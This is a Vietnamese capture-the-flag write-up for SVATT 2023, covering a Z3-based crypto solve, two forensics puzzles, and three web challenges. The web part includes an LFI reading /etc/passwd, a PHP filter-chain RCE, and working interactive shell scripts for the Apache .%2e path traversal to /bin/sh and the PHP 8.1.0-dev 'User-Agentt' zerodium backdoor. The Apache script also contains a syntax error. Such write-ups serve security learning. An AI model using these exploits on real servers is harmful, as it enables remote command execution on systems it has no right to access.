# **Write-up SVATT 2023**

| Challenge     | FLAG|
| ----------- | ----------- |
| [**Crypto-1**](#crypto-1)      | `FLAG{s0me_m4th_1s_3asy_1f_y0u_kn0w_4b0ut_m0dular_4r1thm3t1c}`      |
| [**For-List list list**](#for-list-list-list)  | `ATTT{GsccawXqx×wdWwd}`        |
| [**For-A Legend**](#for-a-legend)  | `ATTT{Tien_tri_Panga}`        |
| [**WEB-1**](#web-1)  |`ATTT{con_3_thang_nua_la_thi_roi}`        |
| [**WEB-2**](#web-2)  | `ATTT{0nly_c0py_p0c_4nd_run_....}`        |
| [**WEB-3**](#web-3)  | `ATTT{...}`        |

## **Crypto-1**

- Ở bài này đề ra cho chúng ta một file encrypt và một file kết quả:

```python
# File encrypt
from Crypto.Util.number import bytes_to_long, getPrime
import random

FLAG = b'FLAG{????????????????????????????????????????????????}'


def gen_params():
    p = getPrime(1024)
    g = random.randint(2, p - 2)
    x = random.randint(2, p - 2)
    h = pow(g, x, p)
    return (p, g, h), x


def encrypt(pubkey):
    p, g, h = pubkey
    m = bytes_to_long(FLAG)
    y = random.randint(2, p - 2)
    s = pow(h, y, p)
    return (g * y % p, m * s % p)


def main():
    pubkey, _ = gen_params()
    c1, c2 = encrypt(pubkey)

    with open('out.txt', 'w') as f:
        f.write(
            f'p = {pubkey[0]}\ng = {pubkey[1]}\nh = {pubkey[2]}\n(c1, c2) = ({c1}, {c2})\n'
        )


if __name__ == "__main__":
    main()

# File output

p = 140513998383733505878882484463832810400773610216464396082090299095443413923172235117457913756664550823719549662902317573376081431193542463845487697907226369167600481120163289426938922732100465539059713541309125384262046419688008790735321015697953751228026907656116801742757145900027205145531958711127892554959
g = 65556906335252739492138792165542310729847274604215491204377659859487941883331877324828668014945205688539538625347791245434017456867211045274632515903354031987751781443770705945360580464425457828577976457587248703877110979526996451487269992053016854914380845578885990371833497436103486601509329626084083968660
h = 15273528733818364088944825564931416580246804828551511408185386076550844914061247386402976630878359077550812761024414293357647284108322195874431618705318411581501804308347288296685298101428242754270584056686889362688314067600725185045055940503536863894910812191441369971393731456033180082689578691282489630975
(c1, c2) = (32930763137657591245671682661065378907876157470073696324706860924174151413813899545628267737923954182518355580308482582884395083978855627014399016379054293488253402225390954280471448716452508005409111284576745690532031769595122489477338312943614861813951717110271786478521584713391571602054127763725617981811, 7670001641599113231861941980345322847092796276245234617022952335365852477157226432010123907328990528181522443870120480148135852521715550020767705947636650531440958788351061564446985872556473800469658897282244374663426300248809407921886806704736303693384639428103469288766910384891882482020192891012087623322)


```

- Tôi sử dụng thư viện Z3 để giải bài toán như sau:

```python
from z3 import *
from Crypto.Util.number import long_to_bytes

p = 140513998383733505878882484463832810400773610216464396082090299095443413923172235117457913756664550823719549662902317573376081431193542463845487697907226369167600481120163289426938922732100465539059713541309125384262046419688008790735321015697953751228026907656116801742757145900027205145531958711127892554959
g = 65556906335252739492138792165542310729847274604215491204377659859487941883331877324828668014945205688539538625347791245434017456867211045274632515903354031987751781443770705945360580464425457828577976457587248703877110979526996451487269992053016854914380845578885990371833497436103486601509329626084083968660
h = 15273528733818364088944825564931416580246804828551511408185386076550844914061247386402976630878359077550812761024414293357647284108322195874431618705318411581501804308347288296685298101428242754270584056686889362688314067600725185045055940503536863894910812191441369971393731456033180082689578691282489630975
(c1, c2) = (32930763137657591245671682661065378907876157470073696324706860924174151413813899545628267737923954182518355580308482582884395083978855627014399016379054293488253402225390954280471448716452508005409111284576745690532031769595122489477338312943614861813951717110271786478521584713391571602054127763725617981811,
            7670001641599113231861941980345322847092796276245234617022952335365852477157226432010123907328990528181522443870120480148135852521715550020767705947636650531440958788351061564446985872556473800469658897282244374663426300248809407921886806704736303693384639428103469288766910384891882482020192891012087623322)
y = Int('y')
m = Int('m')
x = Solver()
x.add(g * y % p == c1)
x.check()
y_a = x.model()[y].as_long()
s = pow(h, y_a, p)
v = Solver()
v.add(m * s % p == c2)
v.add(m > 0)
v.check()
print(long_to_bytes(v.model()[m].as_long()))

#FLAG{s0me_m4th_1s_3asy_1f_y0u_kn0w_4b0ut_m0dular_4r1thm3t1c}
```

## **For-List list list**

- Ở đây chúng ta có một file zip. Sau khi giải nén ta ta được những thư mục như sau:

![](./img_dt/Screenshot%202023-06-29%20121246.png)

- Tôi thực hiện liệt kê hết tất cả các file con.

![](./img_dt/Screenshot%202023-06-29%20121444.png)

- Tôi biết có 28 file và tôi đoán rằng mỗi tên file là vị trí trong chuỗi và thư mục cha ứng với đó là kí tự.

- Tôi viết lại được một đoạn chuỗi như sau: `QVRUVHtHc2NjYXdYcXjXd2RXd2R9  -> (base64_decode) -> ATTT{GsccawXqx×wdWwd}`

## **For-A Legend**

- Sau khi nhận được một file pcapng ta chọn `Chuột phải->Follow->TCP stream`

![](./img_dt/Screenshot%202023-06-29%20141916.png)

- Chúng ta thấy được đây là một file ảnh. Sau khi lấy được hex và ta sẽ tạo được một file ảnh như sau:

![](./img_dt/Screenshot%202023-06-29%20142412.png)

- Dựa vào đề bài “Letter in the Sun ” và ta nhìn thấy ánh nắng hình chấm than chiếu vào chữ CO trên ngôi đền -> Mật khẩu file zip là `CO`. Flag: `ATTT{Tien_tri_Panga}`

## **Web-2**

- Ở trang web này chúng ta nhận ra rằng tại đây có khả năng tồn tại lỗ hổng `LFI`.

![](./img_dt/Screenshot%202023-06-29%20150813.png)

- Và tôi đã thử một số path và đọc được file etc/passwd như sau:

![](./img_dt/Screenshot%202023-06-29%20151705.png)

- Tại đây tôi sử dụng `LFI using wrappers PHP://filter`

- Sau khi thực hiện tấn công và nhận được base64 và thực hiện decode base64 để đọc source code như sau:

![](./img_dt/Screenshot%202023-06-29%20153525.png)

```php
<?php
if (!isset($_GET['file'])) {
    $_GET['file'] = 'home.php';
}
require($_GET['file']);
?>
```

- Sử dụng [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) để có thể injection payload php vào để chúng ta có thể RCE.

![](./img_dt/Screenshot%202023-06-29%20161523.png)

![](./img_dt/Screenshot%202023-06-29%20161626.png)

- Chúng ta sẽ thành công RCE và đọc được file flag:

![](./img_dt/Screenshot%202023-06-29%20161732.png)

`FLAG: ATTT{0nly_c0py_p0c_4nd_run_....}`

## **Web-3**

- Sau khi đọc source của trang tôi thấy một file httpd.conf nên tôi đoán rằng lỗ hổng trang web này có thể xuất phát từ từ do cấu hình hệ thống dẫn đến `Path Traversal`.

- Chúng ta chú ý đến file httpd.conf:

```

ServerRoot "/usr/local/apache2"


Listen 80

LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_file_module modules/mod_authn_file.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule authz_groupfile_module modules/mod_authz_groupfile.so
LoadModule authz_user_module modules/mod_authz_user.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule access_compat_module modules/mod_access_compat.so
LoadModule auth_basic_module modules/mod_auth_basic.so
LoadModule reqtimeout_module modules/mod_reqtimeout.so
LoadModule filter_module modules/mod_filter.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule env_module modules/mod_env.so
LoadModule headers_module modules/mod_headers.so
LoadModule setenvif_module modules/mod_setenvif.so
LoadModule version_module modules/mod_version.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule status_module modules/mod_status.so
LoadModule autoindex_module modules/mod_autoindex.so
<IfModule !mpm_prefork_module>
        LoadModule cgid_module modules/mod_cgid.so
</IfModule>
<IfModule mpm_prefork_module>
</IfModule>
LoadModule dir_module modules/mod_dir.so
LoadModule alias_module modules/mod_alias.so

<IfModule unixd_module>
User daemon
Group daemon

</IfModule>

ServerAdmin you@example.com


<Directory />
    AllowOverride none
    Require all granted
</Directory>


DocumentRoot "/usr/local/apache2/htdocs"
<Directory "/usr/local/apache2/htdocs">
    Options Indexes FollowSymLinks

    AllowOverride None

    Require all granted
</Directory>

<IfModule dir_module>
    DirectoryIndex index.html
</IfModule>

<Files ".ht*">
    Require all denied
</Files>

ErrorLog /proc/self/fd/2

LogLevel warn

<IfModule log_config_module>
    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %b" common

    <IfModule logio_module>
      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
    </IfModule>

    CustomLog /proc/self/fd/1 common

</IfModule>

<IfModule alias_module>


    ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"

</IfModule>

<IfModule cgid_module>
</IfModule>

<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>

<IfModule headers_module>
    RequestHeader unset Proxy early
</IfModule>

<IfModule mime_module>
    TypesConfig conf/mime.types

    AddType application/x-compress .Z
    AddType application/x-gzip .gz .tgz

</IfModule>

<IfModule proxy_html_module>
Include conf/extra/proxy-html.conf
</IfModule>

<IfModule ssl_module>
SSLRandomSeed startup builtin
SSLRandomSeed connect builtin
</IfModule>

ServerSignature Off
ServerTokens Prod

```

```
<Directory />
    AllowOverride none
    Require all granted
</Directory>
```

- `<Directory />`: Đây là chỉ định đường dẫn tới thư mục mà các cấu hình sau đó sẽ áp dụng. Trong trường hợp này, thư mục gốc ("/") được chỉ định.

- `AllowOverride none`: Đây là chỉ định cho phép hoặc không cho phép sử dụng các chỉ thị ghi đè (override directives) từ các tệp tin cấu hình khác nhau (như .htaccess) trong thư mục này. Trong trường hợp này, không cho phép ghi đè bất kỳ cấu hình nào.

- `Require all granted:` Đây là chỉ định quyền truy cập cho tất cả các yêu cầu tới thư mục. Trong trường hợp này, tất cả các yêu cầu được phép truy cập vào thư mục gốc ("/").

- Chúng ta chú ý đến :

```
<IfModule !mpm_prefork_module>
        LoadModule cgid_module modules/mod_cgid.so
</IfModule>

<IfModule alias_module>
    ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
</IfModule>

<IfModule cgid_module>
</IfModule>

<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>

<IfModule cgid_module>
</IfModule>

<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>
```

- RCE chỉ khả dụng trên máy chủ nếu bật mod_cgi. Mod_cgi bị tắt trong cấu hình máy chủ Apache http mặc định, phải có quyền thực thi cho /bin/sh.

- Bất kỳ tệp nào có trình xử lý cgi-script sẽ được coi là tập lệnh CGI và được chạy bởi máy chủ, với đầu ra của nó được trả lại cho máy khách. Các tệp có được trình xử lý này bằng cách có tên chứa phần mở rộng được xác định bởi chỉ thị AddHandler hoặc bằng cách nằm trong thư mục ScriptAlias.

- Mọi yêu cầu gửi đến đường dẫn <http://example.com/cgi-bin/> sẽ được máy chủ phân giải và thực thi từ thư mục /usr/local/apache2/cgi-bin/. Điều này cho phép máy chủ chạy các chương trình CGI và trả về kết quả cho yêu cầu từ đường dẫn /cgi-bin/.

> Một ví dụ đơn giản CGI bằng python.

`1.`  Ta có một file hello.py

```python
#!/usr/bin/env python

print("Content-Type: text/html")
print()
print("<h1>Hello, CGI World!</h1>")
```

`2.`  Cấu hình máy chủ web Apache để chấp nhận CGI bằng cách thêm các dòng sau vào tệp cấu hình httpd.conf hoặc apache2.conf:

```
<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    AddHandler cgi-script .cgi .py
    Require all granted
</Directory>
```

- Đặt tập tin hello.py vào thư mục /usr/local/apache2/cgi-bin.

- Khởi động lại máy chủ web Apache.

- Truy cập vào địa chỉ <http://localhost/cgi-bin/hello.py> trong trình duyệt của bạn.

- Khi bạn truy cập vào địa chỉ đó, mã CGI sẽ được thực thi và kết quả "Hello, CGI World!" sẽ được hiển thị trên trang web. Đây là một ví dụ đơn giản về việc sử dụng CGI để tạo ra nội dung động trên máy chủ web.

> Thực hiện khai thác

![](./img_dt/Screenshot%202023-06-29%20221346.png)

- Đối với apache 2.4.25 chức năng chuẩn hóa đường dẫn trong ứng dụng chịu trách nhiệm giải mã các giá trị được mã hóa ở URL từ URI để ngăn chặn việc lợi dụng lỗ hỗng Path traversal. Chức năng này đã dễ dàng bị vượt qua khi kẻ tấn công mã hóa thành "%2e" ở dấu chấm thứ 2, từ đó kẻ tấn công có thể chuyển ../ thành .%2e/ để thực hiện việc tấn công.

- Apache ver 2.4.25 + Cấu hình sai directory directive(giải thích ở trên) + enable mod_cgi
⇒ Remote Code Execution (Thực thi mã từ xa)​

- Tôi đã viết một mã khai thác như sau:

```python
import argparse
import requests


def runcmd(target):
    url = 'http://{}'.format(target)
    req = requests.get(url)
    while True:
        cmd = input("Nhap cmd:")
        if (cmd != 'exit'):
            if ('https' not in req.url):
                url = "http://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            else:
                url = "https://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            data = "echo; {}".format(cmd)
            session = requests.Session()
            req = requests.Request(
                method='POST', url=url, data=data).prepare()
            req.url = url
            print(session.send(req).text, end='')

        else:
            exit(0)


def main():
    parser = argparse.ArgumentParser(description="Apache2 2.4.49 Exploit")
    parser.add_argument(
        '-t', help=IP or Domain', required=True)
    arg = parser.parse_args()
    try:
        runcmd(arg.target)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)


if __name__ == '__main__':
    main()
```

## **Web-1**

- Quan sát phản hồi ta thấy rằng trang web sử dụng phiên bản :`PHP/8.1.0-dev`

![](./img_dt/Screenshot%202023-06-29%20230245.png)

- Tôi tìm kiếm trên mạng đã thấy một CVE của phiên bản này có thể dẫn đến RCE.

![](./img_dt/Screenshot%202023-06-29%20230506.png)

- Ở phiên bản này có lỗi liên quan đến header. Do người lập trình đã vô tình viết sai tên header.

- Giải thích code như sau:
    1. Tiếp theo, dòng zend_hash_str_find được sử dụng để tìm giá trị của khóa "HTTP_USER_AGENTT" trong mảng $_SERVER. Giá trị này được gán cho biến enc.

    2. Dòng convert_to_string(enc) được sử dụng để đảm bảo rằng biến enc có kiểu dữ liệu là chuỗi (string). Nếu không phải, nó sẽ chuyển đổi kiểu dữ liệu của enc thành chuỗi.

    3. Sau đó, dòng strstr kiểm tra xem chuỗi trong biến enc có chứa chuỗi "zerodium" hay không. Nếu có, một khối zend_try được bắt đầu.

    4. Trong khối zend_try, hàm zend_eval_string được sử dụng để đánh giá và thực thi một đoạn mã PHP được trích xuất từ chuỗi enc bắt đầu từ vị trí thứ 8. Đoạn mã này có mục đích không rõ ràng và đánh dấu là "REMOVETHIS: sold to zerodium, mid 2017". Có thể đây là một cơ chế ẩn để thực hiện một hành động cụ thể nếu chuỗi "zerodium" được tìm thấy trong HTTP_USER_AGENT.

- Tôi đã viết một script để có thể RCE như sau:

```python
import os
import re
import requests

host = input("Enter the host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    try:
        while 1:
            cmd = input("$ ")
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36",
                "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers=headers,
                                   allow_redirects=False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>', 1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
# ATTT{con_3_thang_nua_la_thi_roi}
```
